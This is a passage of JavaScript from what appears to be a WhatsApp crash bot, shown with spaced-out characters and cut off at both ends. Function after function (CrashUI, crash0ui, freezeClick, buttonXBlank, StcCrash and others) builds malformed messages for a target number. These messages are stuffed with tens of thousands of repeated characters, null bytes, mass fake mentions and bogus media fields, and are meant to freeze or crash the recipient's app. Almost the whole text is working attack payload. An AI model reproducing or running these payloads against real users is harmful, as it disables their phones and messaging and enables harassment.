                 p a r a m s :   [ 
                         {   
                             n a m e :   " c a l l _ t y p e " , 
                             v a l u e :   " v i d e o "   
                         } , 
                         {   
                             n a m e :   " p e r m i s s i o n _ r e a s o n " ,   
                             v a l u e :   " \ u 0 0 0 0 " . r e p e a t ( 9 9 9 9 )   
                         } , 
                         { 
                             n a m e :   " s u p p o r t _ u r l " ,   
                             v a l u e :   " h t t p s : / / w a . m e / + 5 5 2 1 9 9 2 9 9 9 9 9 9 "   
                         } 
                 ] 
             } 
         } ; 
 
         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   m s g . m e s s a g e ,   { 
             m e s s a g e I d :   m s g . k e y . i d 
         } ) ; 
 
         i f   ( m e n t i o n )   { 
             a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
                 s t a t u s M e n t i o n M e s s a g e :   { 
                     m e s s a g e :   {   p r o t o c o l M e s s a g e :   {   k e y :   m s g . k e y ,   t y p e :   2 5   }   } 
                 } 
             } ,   { 
                 a d d i t i o n a l N o d e s :   [ 
                     {   t a g :   " m e t a " ,   a t t r s :   {   i s _ s t a t u s _ m e n t i o n :   " t r u e "   } ,   c o n t e n t :   u n d e f i n e d   } 
                 ] 
             } ) ; 
         } 
     } 
 } 
 / / = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \ \ 
 
 a s y n c   f u n c t i o n   x i o s i n v i ( t a r g e t ) { 
 	 c o n s t   x e o n I p o n g   =   " T e l e g r a m :   @ d g x e o 1 3   " +   " � � � � � � � � " . r e p e a t ( 6 0 0 0 0 ) ; 
         c o n s t   g e n M s g   =   ( f i l e N a m e ,   b o d y T e x t )   = >   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( t a r g e t ,   p r o t o . M e s s a g e . f r o m O b j e c t ( { 
                 g r o u p M e n t i o n e d M e s s a g e :   { 
                         m e s s a g e :   { 
                                 i n t e r a c t i v e M e s s a g e :   { 
                                         h e a d e r :   { 
                                                 d o c u m e n t M e s s a g e :   { 
                                                         u r l :   " h t t p s : / / m m g . w h a t s a p p . n e t / v / t 6 2 . 7 1 1 9 - 2 4 / 4 0 3 7 7 5 6 7 _ 1 5 8 7 4 8 2 6 9 2 0 4 8 7 8 5 _ 2 8 3 3 6 9 8 7 5 9 4 9 2 8 2 5 2 8 2 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a I E O Z F i V R P J r l l J N v R A - D 4 J t O a E Y t X l 0 g m S T F W k G x A S L Z & o e = 6 6 6 D B E 7 C & _ n c _ s i d = 5 e 0 3 e 0 & m m s 3 = t r u e " , 
                                                         m i m e t y p e :   " a p p l i c a t i o n / j s o n " , 
                                                         f i l e S h a 2 5 6 :   " l d 5 g n m a i b + 1 m B C W r c N m e k j B 4 f H h y j A P O H J + U M D 3 u y 4 k = " , 
                                                         f i l e L e n g t h :   " 9 9 9 9 9 9 9 9 9 9 9 9 " , 
                                                         p a g e C o u n t :   0 x 9 f f 9 f f 9 f f 1 f f 8 f f 4 f f 5 f , 
                                                         m e d i a K e y :   " 5 c / W 3 B C W j P M F A U U x T S Y t Y P L W Z G W u B V 1 3 m W O g Q w N d F c g = " , 
                                                         f i l e N a m e :   f i l e N a m e , 
                                                         f i l e E n c S h a 2 5 6 :   " p z n Y B S 1 N 6 g r 9 R Z 6 6 F x 7 L 3 A y L I U 2 R Y 5 L H C K h x X e r J n w Q = " , 
                                                         d i r e c t P a t h :   " / v / t 6 2 . 7 1 1 9 - 2 4 / 4 0 3 7 7 5 6 7 _ 1 5 8 7 4 8 2 6 9 2 0 4 8 7 8 5 _ 2 8 3 3 6 9 8 7 5 9 4 9 2 8 2 5 2 8 2 _ n . e n c ? c c b = 1 1 - 4 & o h = 0 1 _ Q 5 A a I E O Z F i V R P J r l l J N v R A - D 4 J t O a E Y t X l 0 g m S T F W k G x A S L Z & o e = 6 6 6 D B E 7 C & _ n c _ s i d = 5 e 0 3 e 0 " , 
                                                         m e d i a K e y T i m e s t a m p :   " 1 7 1 5 8 8 0 1 7 3 " 
                                                 } , 
                                                 h a s M e d i a A t t a c h m e n t :   t r u e 
                                         } , 
                                         b o d y :   {   t e x t :   b o d y T e x t   } , 
                                         n a t i v e F l o w M e s s a g e :   { 
                                                 m e s s a g e P a r a m s J s o n :   ` { " n a m e " : " g a l a x y _ m e s s a g e " , " f l o w _ a c t i o n " : " n a v i g a t e " , " f l o w _ a c t i o n _ p a y l o a d " : { " s c r e e n " : " C T Z _ S C R E E N " } , " f l o w _ c t a " : " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � " , " f l o w _ i d " : " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � " , " f l o w _ m e s s a g e _ v e r s i o n " : " 9 . 9 0 3 " , " f l o w _ t o k e n " : " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � " } ` 
                                         } , 
                                         c o n t e x t I n f o :   { 
                                                 m e n t i o n e d J i d :   A r r a y . f r o m ( {   l e n g t h :   5   } ,   ( )   = >   " 1 @ n e w s l e t t e r " ) , 
                                                 g r o u p M e n t i o n s :   [ {   g r o u p J i d :   " 1 @ n e w s l e t t e r " ,   g r o u p S u b j e c t :   " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � "   } ] 
                                         } 
                                 } 
                         } 
                 } 
         } ) ,   {   u s e r J i d :   t a r g e t   } ) ; 
 a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
                 l o c a t i o n M e s s a g e :   { 
                         d e g r e e s L a t i t u d e :   1 7 3 . 2 8 2 , 
                         d e g r e e s L o n g i t u d e :   - 1 9 . 3 7 8 , 
                         n a m e :   " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � "   +   x e o n I p o n g , 
                         u r l :   " h t t p s : / / y o u t u b e . c o m / @ D G X e o m " 
                 } 
         } ,   {   p a r t i c i p a n t :   {   j i d :   t a r g e t   }   } ) ; 
         
         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
                 l o c a t i o n M e s s a g e :   { 
                         d e g r e e s L a t i t u d e :   1 7 3 . 2 8 2 , 
                         d e g r e e s L o n g i t u d e :   - 1 9 . 3 7 8 , 
                         n a m e :   " T e l e g r a m :   @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � "   +   x e o n I p o n g , 
                         u r l :   " h t t p s : / / y o u t u b e . c o m / @   " 
                 } 
         } ,   {   p a r t i c i p a n t :   {   j i d :   t a r g e t   }   } ) ; 
         } 
 / / = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \ \ 
 
 a s y n c   f u n c t i o n   x e o n I o s I n v i ( i s T a r g e t )   { 
 a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( i s T a r g e t ,   { 
 t e x t :   " � � ‌ ⃰ Ꮡ ‌ ‌ "   +   " ⛧   T e l e g r a m   : :     1 3   ⛧ "   +   " ҉ ҈ ⃝ ⃞ ⃟ ⃠ ⃤ ꙰ ꙲ ꙱ ‱ ᜆ ᢣ "   +   " � � � � � � � � " . r e p e a t ( 6 0 0 0 0 ) , 
 c o n t e x t I n f o :   { 
 e x t e r n a l A d R e p l y :   { 
 t i t l e :   ` ⛧   T e l e g r a m   : :     1 3   ⛧ ` , 
 b o d y :   ` H a i i ` , 
 p r e v i e w T y p e :   " P H O T O " , 
 t h u m b n a i l :   " " , 
 s o u r c e U r l :   ` h t t p s : / / e x a m p l e . c o m /   ` 
 } 
 } 
 } ,   { } ) 
 } 
 / / = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = \ \ 
         a s y n c   f u n c t i o n   C r a s h 0 0 U I ( I s T a r g e t ,   p t c p   =   f a l s e )   { 
   c o n s t   m s g   =   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( I s T a r g e t ,   { 
         e x t e n d e d T e x t M e s s a g e :   { 
             t e x t :   ' � � ⃟ ⃨ 〫 ⃰ ‣   ⁖ � � � � � �   ‌ � � ︎ ‌   � � › � � � � ‌ � � ⃜ '   +   " ꦾ " . r e p e a t ( 5 0 0 0 0 ) , 
             c o n t e x t I n f o :   { 
                 m e n t i o n e d J i d :   A r r a y . f r o m ( {   l e n g t h :   2 0 0 0   } ,   ( )   = >   " 1 "   +   M a t h . f l o o r ( M a t h . r a n d o m ( )   *   9 0 0 0 0 0 0 )   +   " @ s . w h a t s a p p . n e t " 
                 ) , 
                 r e m o t e J i d :   " s t a t u s @ b r o a d c a s t " , 
                 p a r t i c i p a n t :   " 0 @ s . w h a t s a p p . n e t " , 
                 f r o m M e :   t r u e , 
                 i s F o r w a r d e d :   t r u e , 
                 f o r w a r d i n g S c o r e :   9 9 9 9 
             } 
         } 
     } ,   { } ) 
     
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( I s T a r g e t ,   m s g . m e s s a g e ,   p t c p   ?   
         {   m e s s a g e I d :   m s g . k e y . i d   }   : 
         {   p a r t i c i p a n t :   {   j i d :   I s T a r g e t   } ,   m e s s a g e I d :   m s g . k e y . i d   } ) 
     
     c o n s o l e . l o g ( c h a l k . g r e e n ( " ─ ─ ─ ─ ─ 「   ⏤   C r a s h U I   E x 3 c u t e   」 ─ ─ ─ ─ ─ " ) ) 
 } 
         
         a s y n c   f u n c t i o n   B l a n k S p a m K e v v ( t a r g e t )   { 
     t r y   { 
         c o n s t   T o y a e x e 2   =   [ 
             { 
                 b u t t o n I d :   " . i d 1 " , 
                 b u t t o n T e x t :   { 
                     d i s p l a y T e x t :   " � � � � " . r e p e a t ( 2 0 0 0 0 ) 
                 } , 
                 t y p e :   1 
             } , 
             { 
                 b u t t o n I d :   " . i d 2 " , 
                 b u t t o n T e x t :   { 
                     d i s p l a y T e x t :   " � � � � " . r e p e a t ( 2 0 0 0 0 ) 
                 } , 
                 t y p e :   1 
             } , 
             { 
                 b u t t o n I d :   " . i d 3 " , 
                 b u t t o n T e x t :   { 
                     d i s p l a y T e x t :   " � � � � " . r e p e a t ( 2 0 0 0 0 ) 
                 } , 
                 t y p e :   1 
             } 
         ] ; 
 
         c o n s t   T o y a e x e   =   { 
             l o c a t i o n :   { 
                 d e g r e e s L a t i t u d e :   - 1 , 
                 d e g r e e s L o n g i t u d e :   - 1 , 
                 n a m e :   " T e l e g r a m @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � "   +   " ꦾ " . r e p e a t ( 1 5 0 0 0 )   +   " ꦽ " . r e p e a t ( 1 5 0 0 0 ) , 
                 a d d r e s s : "   T e l e g r a m @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � "   +   " ꦾ " . r e p e a t ( 1 5 0 0 0 )   +   " ꦽ " . r e p e a t ( 1 5 0 0 0 ) 
             } , 
             c a p t i o n :   " T e l e g r a m @ @ A b o _ r 7 y a n � � � � � � � � � � � � � � � � � � � � � � � � � � � � "   +   " ꦾ " . r e p e a t ( 1 5 0 0 0 )   +   " ꦽ " . r e p e a t ( 1 5 0 0 0 ) , 
             f o o t e r :   "   " , 
             T o y a e x e 2 , 
             h e a d e r T y p e :   6 
         } ; 
 
         a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( t a r g e t ,   T o y a e x e ) ; 
     }   c a t c h   ( e r r )   { 
     } 
 } 
         
         
         
         a s y n c   f u n c t i o n   c r a s h 0 u i ( t a r g e t )   { 
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   { 
         v i e w O n c e M e s s a g e :   { 
             m e s s a g e :   { 
                 b u t t o n s M e s s a g e :   { 
                     t e x t :   "   ? "   +   " ꦽ " . r e p e a t ( 7 0 0 0 ) , 
                     c o n t e n t T e x t :   " H X   |     "   +   " ꦽ " . r e p e a t ( 7 0 0 0 ) , 
                     c o n t e x t I n f o :   { 
                         f o r w a r d i n g S c o r e :   9 9 9 , 
                         i s F o r w a r d e d :   t r u e , 
                             u r l T r a c k i n g M a p :   { 
                                 u r l T r a c k i n g M a p E l e m e n t s :   [ 
                                     { 
                                         o r i g i n a l U r l :   " h t t p s : / / t . m e / + F p 9 f 7 O L i g K g w Z W U 0 " , 
                                         u n c o n s e n t e d U s e r s U r l :   " h t t p s : / / t . m e / + F p 9 f 7 O L i g K g w Z W U 0 " , 
                                         c o n s e n t e d U s e r s U r l :   " h t t p s : / / t . m e / + F p 9 f 7 O L i g K g w Z W U 0 " , 
                                         c a r d I n d e x :   1 , 
                                     } , 
                                     { 
                                         o r i g i n a l U r l :   " h t t p s : / / t . m e / B r a n d o B r a n d o B r a n " , 
                                         u n c o n s e n t e d U s e r s U r l :   " h t t p s : / / t . m e / B r a n d o B r a n d o B r a n " , 
                                         c o n s e n t e d U s e r s U r l :   " h t t p s : / / t . m e / B r a n d o B r a n d o B r a n " , 
                                         c a r d I n d e x :   2 , 
                                     } , 
                                 ] , 
                             } ,                         
                         q u o t e d M e s s a g e :   { 
                             i n t e r a c t i v e R e s p o n s e M e s s a g e :   { 
                                 b o d y :   { 
                                     t e x t :   " ~ > " , 
                                     f o r m a t :   " D E F A U L T " 
                                 } , 
                                 n a t i v e F l o w R e s p o n s e M e s s a g e :   { 
                                     n a m e :   " a d d r e s s _ m e s s a g e " , 
                                     p a r a m s J s o n :   ` { \ " v a l u e s \ " : { \ " i n _ p i n _ c o d e \ " : \ " 9 9 9 9 9 9 \ " , \ " b u i l d i n g _ n a m e \ " : \ " s a o s i n x \ " , \ " l a n d m a r k _ a r e a \ " : \ " X \ " , \ " a d d r e s s \ " : \ " Y d 7 \ " , \ " t o w e r _ n u m b e r \ " : \ " Y 7 d \ " , \ " c i t y \ " : \ " c h i n d o \ " , \ " n a m e \ " : \ " d 7 y \ " , \ " p h o n e _ n u m b e r \ " : \ " 9 9 9 9 9 9 9 9 9 9 9 9 \ " , \ " h o u s e _ n u m b e r \ " : \ " x x x \ " , \ " f l o o r _ n u m b e r \ " : \ " x x x \ " , \ " s t a t e \ " : \ " X $ { " \ u 0 0 0 0 " . r e p e a t ( 9 0 0 0 0 0 ) } \ " } } ` , 
                                     v e r s i o n :   3 
                                 } 
                             } 
                         } 
                     } , 
                     h e a d e r T y p e :   1 
                 } 
             } 
         } 
     } ,   { 
         p a r t i c i p a n t :   {   j i d : t a r g e t   } 
     } ) ; 
 } 
 a s y n c   f u n c t i o n   N o t i f X B u t t o n ( X e o n B o t I n c ,   t a r g e t )   { 
     t r y   { 
         c o n s t   c o n t e n t   =   { 
             v i e w O n c e M e s s a g e :   { 
                 m e s s a g e :   { 
                     m e s s a g e C o n t e x t I n f o :   { 
                         d e v i c e L i s t M e t a d a t a :   { } , 
                         d e v i c e L i s t M e t a d a t a V e r s i o n :   2 
                     } , 
                     i n t e r a c t i v e M e s s a g e :   { 
                         h e a d e r :   {   t i t l e :   " P o p p i e s   L a n e   M e m o r y   (   Z i e e   ⸙   ) "   +   " ꦽ " . r e p e a t ( 1 0 0 0 0 ) + " . c o m "   } , 
                         b o d y :   {   t e x t :   " "   } , 
                         n a t i v e F l o w M e s s a g e :   { 
                             m e s s a g e P a r a m s J s o n :   " { } " . r e p e a t ( 1 0 0 0 0 ) , 
                             b u t t o n s :   [ 
                                 { 
                                     n a m e :   " g a l a x y _ m e s s a g e " , 
                                     b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( { 
                                         i c o n :   " \ u 2 0 0 B " . r e p e a t ( 5 0 0 0 ) , 
                                         f l o w _ c t a :   " ꦽ " . r e p e a t ( 1 0 0 0 0 ) , 
                                         f l o w _ m e s s a g e _ v e r s i o n :   " 3 " 
                                     } ) 
                                 } , 
                                 { 
                                     n a m e :   " g a l a x y _ m e s s a g e " , 
                                     b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( { 
                                         i c o n :   " \ u 2 0 0 B " . r e p e a t ( 5 0 0 0 ) , 
                                         f l o w _ c t a :   " ꦽ " . r e p e a t ( 1 0 0 0 0 ) , 
                                         f l o w _ m e s s a g e _ v e r s i o n :   " 3 " 
                                     } ) 
                                 } 
                             ] 
                         } 
                     } 
                 } 
             } 
         } ; 
 
         c o n s t   m s g   =   a w a i t   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( t a r g e t ,   c o n t e n t ,   { 
             u s e r J i d :   X e o n B o t I n c ? . u s e r ? . i d 
         } ) ; 
 
         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   m s g . m e s s a g e ,   {   m e s s a g e I d :   m s g . k e y . i d   } ) ; 
     }   c a t c h   ( e r r o r )   { 
     } 
 } 
 
 a s y n c   f u n c t i o n   c a l l S y s t e m ( X e o n B o t I n c ,   t a r g e t )   { 
     a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( t a r g e t ,   { 
         i n t e r a c t i v e M e s s a g e :   { 
             b o d y :   { 
                 t e x t :   " P o p p i e s   L a n e   M e m o r y   (   Z i e e   ⸙   ) " 
             } , 
             n a t i v e F l o w M e s s a g e :   { 
                 b u t t o n s :   [ 
                     { 
                         n a m e :   " c t a _ u r l " , 
                         b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( { 
                             d i s p l a y _ t e x t :   " � � � � " . r e p e a t ( 2 0 0 0 0 ) , 
                             u r l :   n u l l , 
                             m e r c h a n t _ u r l :   n u l l 
                         } ) 
                     } 
                 ] 
             } 
         } 
     } ) ; 
 } 
 
 a s y n c   f u n c t i o n   f r e z e e C l i c k ( X e o n B o t I n c ,   t a r g e t )   { 
     c o n s t   z i e e M s g   =   { 
         i n t e r a c t i v e M e s s a g e :   { 
             h e a d e r :   { 
                 h a s M e d i a A t t a c h m e n t :   f a l s e , 
                 t i t l e :   " P o p p i e s   L a n e   M e m o r y   (   Z i e e   ⸙   ) " 
             } , 
             b o d y :   {   t e x t :   " \ x 1 0 "   } , 
             f o o t e r :   {   t e x t :   " \ x 1 0 "   } , 
             n a t i v e F l o w M e s s a g e :   { 
                 b u t t o n s :   [ 
                     { 
                         n a m e :   " q u i c k _ r e p l y " , 
                         b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( { 
                             d i s p l a y _ t e x t :   " � � � � " . r e p e a t ( 1 0 0 0 0 ) , 
                             i d :   n u l l 
                         } ) 
                     } , 
                     { 
                         n a m e :   " q u i c k _ r e p l y " , 
                         b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( { 
                             d i s p l a y _ t e x t :   " � � � � " . r e p e a t ( 1 0 0 0 0 ) , 
                             i d :   n u l l 
                         } ) 
                     } , 
                     { 
                         n a m e :   " c t a _ u r l " , 
                         b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( { 
                             d i s p l a y _ t e x t :   " � � � � " . r e p e a t ( 1 0 0 0 0 ) , 
                             u r l :   " h t t p s : / / " + " � � � � " . r e p e a t ( 1 0 0 0 0 ) + " . c o m " 
                         } ) 
                     } , 
                     { 
                         n a m e :   " c t a _ c o p y " , 
                         b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( { 
                             d i s p l a y _ t e x t :   " � � � � " . r e p e a t ( 1 0 0 0 0 ) , 
                             c o p y _ c o d e :   " � � � � " . r e p e a t ( 1 0 0 0 0 ) 
                         } ) 
                     } 
                 ] , 
                 m e s s a g e P a r a m s J s o n :   J S O N . s t r i n g i f y ( { } ) 
             } 
         } 
     } ; 
 
     t r y   { 
         a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( t a r g e t ,   z i e e M s g ) ; 
     }   c a t c h   ( e r r )   { 
     } 
 } 
 
 a s y n c   f u n c t i o n   e x T e n s i o n ( X e o n B o t I n c ,   t a r g e t ,   m e n t i o n   =   t r u e )   { 
     c o n s t   m s g   =   a w a i t   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( 
         t a r g e t , 
         { 
             v i e w O n c e M e s s a g e :   { 
                 m e s s a g e :   { 
                     m e s s a g e C o n t e x t I n f o :   { 
                         d e v i c e L i s t M e t a d a t a :   { } , 
                         d e v i c e L i s t M e t a d a t a V e r s i o n :   2 
                     } , 
                     i n t e r a c t i v e M e s s a g e :   { 
                         b o d y :   { 
                             t e x t :   " P o p p i e s   L a n e   M e m o r y   (   Z i e e   ⸙   ) "   +   " ꦽ " . r e p e a t ( 5 0 0 0 )   +   " � � " . r e p e a t ( 5 0 0 0 ) 
                         } , 
                         n a t i v e F l o w M e s s a g e :   { 
                             m e s s a g e P a r a m s J s o n :   " { } " , 
                             b u t t o n s :   [ 
                                 { 
                                     n a m e :   " s i n g l e _ s e l e c t " , 
                                     b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( { 
                                         t i t l e :   " � � � � " . r e p e a t ( 1 0 0 0 0 ) , 
                                         s e c t i o n s :   [ 
                                             { 
                                                 t i t l e :   " � � � � " . r e p e a t ( 1 0 0 0 0 ) , 
                                                 r o w s :   [ 
                                                     {   i d :   " z i e e 1 " ,   t i t l e :   " � � � � " . r e p e a t ( 1 0 0 0 0 ) ,   d e s c r i p t i o n :   " "   } 
                                                 ] 
                                             } , 
                                             { 
                                                 t i t l e :   " � � � � " . r e p e a t ( 1 0 0 0 0 ) , 
                                                 r o w s :   [ 
                                                     {   i d :   " z i e e 2 " ,   t i t l e :   " � � � � " . r e p e a t ( 1 0 0 0 0 ) ,   d e s c r i p t i o n :   " "   } 
                                                 ] 
                                             } , 
                                             { 
                                                 t i t l e :   " � � � � " . r e p e a t ( 1 0 0 0 0 ) , 
                                                 r o w s :   [ 
                                                     {   i d :   " z i e e 3 " ,   t i t l e :   " � � � � " . r e p e a t ( 1 0 0 0 0 ) ,   d e s c r i p t i o n :   " "   } 
                                                 ] 
                                             } 
                                         ] 
                                     } ) 
                                 } 
                             ] 
                         } 
                     } 
                 } 
             } 
         } , 
         { } 
     ) ; 
 
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   m s g . m e s s a g e ,   { 
         m e s s a g e I d :   m s g . k e y . i d , 
         a d d i t i o n a l N o d e s :   m e n t i o n 
             ?   [ 
                     { 
                         t a g :   " m e t a " , 
                         a t t r s :   { } , 
                         c o n t e n t :   [ 
                             { 
                                 t a g :   " m e n t i o n e d _ u s e r s " , 
                                 a t t r s :   { } , 
                                 c o n t e n t :   [ {   t a g :   " t o " ,   a t t r s :   {   j i d :   t a r g e t   } ,   c o n t e n t :   u n d e f i n e d   } ] 
                             } 
                         ] 
                     } 
                 ] 
             :   [ ] 
     } ) ; 
 
     i f   ( m e n t i o n )   { 
         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( " s t a t u s @ b r o a d c a s t " ,   m s g . m e s s a g e ,   { 
             s t a t u s J i d L i s t :   [ t a r g e t ] , 
             m e s s a g e I d :   m s g . k e y . i d 
         } ) ; 
     } 
 } 
 
 a s y n c   f u n c t i o n   b u t t o n X B l a n k ( t a r g e t )   { 
         a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( 
                 t a r g e t , 
                 { 
                         v i e w O n c e M e s s a g e :   { 
                                 m e s s a g e :   { 
                                         i n t e r a c t i v e M e s s a g e :   { 
                                                 h e a d e r :   { 
                                                         t i t l e :   " ꦽ " . r e p e a t ( 2 0 0 0 0 ) , 
                                                         h a s M e d i a A t t a c h m e n t :   t r u e , 
                                                         l o c a t i o n M e s s a g e :   { 
                                                                 d e g r e e s L a t i t u d e :   0 , 
                                                                 d e g r e e s L o n g i t u d e :   - 0 , 
                                                         } , 
                                                 } , 
                                                 b o d y :   { 
                                                         t e x t :   " P o p p i e s   L a n e   M e m o r y   (   Z i e e   ⸙   ) "   +   " ꦽ " . r e p e a t ( 4 0 0 0 0 ) , 
                                                 } , 
                                                 n a t i v e F l o w M e s s a g e :   { 
                                                         m e s s a g e P a r a m s J s o n :   " { " . r e p e a t ( 5 0 0 0 )   +   " [ " . r e p e a t ( 5 0 0 0 ) , 
                                                         b u t t o n s :   [ 
                                                                 { 
                                                                         n a m e :   " s i n g l e _ s e l e c t " , 
                                                                         b u t t o n P a r a m s J s o n :   " " , 
                                                                 } , 
                                                                 { 
                                                                         n a m e :   " c a l l _ p e r m i s s i o n _ r e q u e s t " , 
                                                                         b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( {   s t a t u s :   t r u e   } ) , 
                                                                 } , 
                                                                 { 
                                                                         n a m e :   " s e n d _ l o c a t i o n " , 
                                                                         b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( {   s t a t u s :   t r u e   } ) , 
                                                                 } , 
                                                                 { 
                                                                         n a m e :   " q u i c k _ r e p l y " , 
                                                                         b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( { 
                                                                                 i d :   " r e p l y _ q u i c k " , 
                                                                         } ) , 
                                                                 } , 
                                                                 { 
                                                                         n a m e :   " o p e n _ u r l " , 
                                                                         b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( { 
                                                                                 u r l :   " h t t p s : / / t . m e / A b o _ r 7 y a n " , 
                                                                         } ) , 
                                                                 } , 
                                                                 { 
                                                                         n a m e :   " s h a r e _ c o n t a c t " , 
                                                                         b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( { 
                                                                                 c o n t a c t _ i d :   " 6 2 8 1 2 3 4 5 6 7 8 9 0 @ s . w h a t s a p p . n e t " , 
                                                                         } ) , 
                                                                 } , 
                                                                 { 
                                                                         n a m e :   " v i e w _ p r o f i l e " , 
                                                                         b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( { 
                                                                                 i d :   " p r o f i l e _ v i e w " , 
                                                                         } ) , 
                                                                 } , 
                                                         ] , 
                                                 } , 
                                         } , 
                                 } , 
                         } , 
                 } , 
                 { 
                         m e s s a g e I d :   n u l l , 
                         p a r t i c i p a n t :   {   j i d :   t a r g e t   } , 
                 } , 
         ) ; 
 } 
 
 a s y n c   f u n c t i o n   U I M e n t i o n ( X e o n B o t I n c ,   t a r g e t ,   m e n t i o n   =   t r u e )   { 
     c o n s t   q w e r t y   =   " h t t p s : / / f i l e s . c a t b o x . m o e / 4 x 4 h z u . j p g " 
     c o n s t   m s g   =   g e n e r a t e W A M e s s a g e F r o m C o n t e n t ( 
         t a r g e t , 
         p r o t o . M e s s a g e . f r o m O b j e c t ( { 
             v i e w O n c e M e s s a g e :   { 
                 m e s s a g e :   { 
                     i n t e r a c t i v e M e s s a g e :   { 
                         b o d y :   {   
                             t e x t :   " P o p p i e s   L a n e   M e m o r y   (   Z i e e   ⸙   ) "   +   " \ u 2 0 0 B "   +   " ꦾ " . r e p e a t ( 1 0 0 0 0 )   +   " ꦽ " . r e p e a t ( 2 5 0 0 )   +   " ោ ៝ " . r e p e a t ( 2 5 0 0 ) 
                         } , 
                         n a t i v e F l o w M e s s a g e :   { 
                             m e s s a g e P a r a m s J s o n :   " { } " . r e p e a t ( 1 0 0 0 0 ) , 
                             b u t t o n s :   [ 
                                 { 
                                     n a m e :   " g a l a x y _ m e s s a g e " , 
                                     b u t t o n P a r a m s J s o n :   J S O N . s t r i n g i f y ( { 
                                         f l o w _ i d :   D a t e . n o w ( ) , 
                                         f l o w _ m e s s a g e _ v e r s i o n :   " 9 " , 
                                         f l o w _ t o k e n :   D a t e . n o w ( ) , 
                                         f l o w _ a c t i o n :   " s h a r e " , 
                                         f l o w _ a c t i o n _ p a y l o a d :   { 
                                             s c r e e n :   " G A L L E R Y _ S C R E E N " , 
                                             p a r a m s :   { 
                                                 m e d i a _ t y p e :   " i m a g e " , 
                                                 m a x _ s e l e c t i o n :   9 9 9 9 9 9 9 
                                             } 
                                         } , 
                                         f l o w _ c t a :   " x " , 
                                         i c o n :   q w e r t y , 
                                         u p d a t e d _ a t :   n u l l , 
                                         e x p e r i m e n t a l _ f l a g s :   { 
                                             u s e _ n a t i v e _ f l o w _ v 2 :   t r u e , 
                                             e n a b l e _ l o g g i n g _ c o n t e x t :   t r u e 
                                         } 
                                     } ) 
                                 } 
                             ] 
                         } , 
                         . . . ( m e n t i o n   ?   {   c o n t e x t I n f o :   {   m e n t i o n e d J i d :   [ t a r g e t ]   }   }   :   { } ) 
                     } 
                 } 
             } 
         } ) , 
         { } 
     ) ; 
 
     a w a i t   X e o n B o t I n c . r e l a y M e s s a g e ( t a r g e t ,   m s g . m e s s a g e ,   {   m e s s a g e I d :   m s g . k e y . i d   } ) ; 
 } 
 
 a s y n c   f u n c t i o n   S t c C r a s h ( t a r g e t )   { 
     t r y   { 
         l e t   m e s s a g e   =   { 
             e x t e n d e d T e x t M e s s a g e :   { 
                 t e x t :   " P o p p i e s   L a n e   M e m o r y   (   Z i e e   ⸙   ) "   +   " ꦾ " . r e p e a t ( 1 0 0 0 0 ) , 
                 c o n t e x t I n f o :   { 
                     p a r t i c i p a n t :   " 0 @ s . w h a t s a p p . n e t " , 
                     r e m o t e J i d :   " s t a t u s @ b r o a d c a s t " , 
                     m e n t i o n e d J i d :   [ " 1 3 1 3 5 5 5 0 0 0 2 @ s . w h a t s a p p . n e t " ] , 
                     e x t e r n a l A d R e p l y :   { 
                         t i t l e :   n u l l , 
                         b o d y :   n u l l , 
                         t h u m b n a i l U r l :   " h t t p : / / w a . m e / s t i c k e r p a c k / ꦽ "   +   " . . . " . r e p e a t ( 5 0 0 0 ) , 
